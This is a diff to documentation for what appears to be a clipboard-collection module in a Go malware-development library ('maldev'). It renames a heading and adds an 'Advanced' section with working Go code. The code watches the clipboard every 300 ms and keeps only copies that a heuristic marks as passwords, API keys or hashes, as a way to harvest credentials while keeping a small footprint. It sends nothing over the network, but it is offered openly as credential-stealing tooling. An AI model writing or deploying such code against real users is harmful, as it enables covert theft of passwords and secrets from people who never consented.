@@ -9,7 +9,7 @@
 
 ---
 
-## For Beginners
+## Primer
 
 Users frequently copy passwords, credentials, and sensitive data to the clipboard. This technique reads clipboard text on demand or monitors it for changes, capturing everything the user copies.
 
@@ -50,6 +50,58 @@ text, err := clipboard.ReadText()
 // Continuous monitoring
 for content := range clipboard.Watch(ctx, 500*time.Millisecond) {
     fmt.Println("Copied:", content)
+}
+```
+
+---
+
+## Advanced — Credential-Focused Filtering
+
+`Watch` emits every clipboard change. In practice only a small fraction of
+copies are interesting. Wrapping the channel in a filter reduces noise and
+limits the on-disk footprint.
+
+```go
+import (
+    "context"
+    "strings"
+    "time"
+    "unicode"
+
+    "github.com/oioio-space/maldev/collection/clipboard"
+)
+
+// looksLikeCredential heuristic — catches passwords, API keys, hashes.
+func looksLikeCredential(s string) bool {
+    if len(s) < 8 || len(s) > 512 {
+        return false
+    }
+    hasDigit, hasUpper, hasSpecial := false, false, false
+    for _, r := range s {
+        switch {
+        case unicode.IsDigit(r):
+            hasDigit = true
+        case unicode.IsUpper(r):
+            hasUpper = true
+        case !unicode.IsLetter(r) && !unicode.IsDigit(r):
+            hasSpecial = true
+        }
+    }
+    return (hasDigit && hasUpper) || hasSpecial ||
+        strings.ContainsAny(s, "@:$%#") // email, URL-style credential
+}
+
+func collectCredentials(ctx context.Context) <-chan string {
+    out := make(chan string)
+    go func() {
+        defer close(out)
+        for text := range clipboard.Watch(ctx, 300*time.Millisecond) {
+            if looksLikeCredential(text) {
+                out <- text
+            }
+        }
+    }()
+    return out
 }
 ```
 
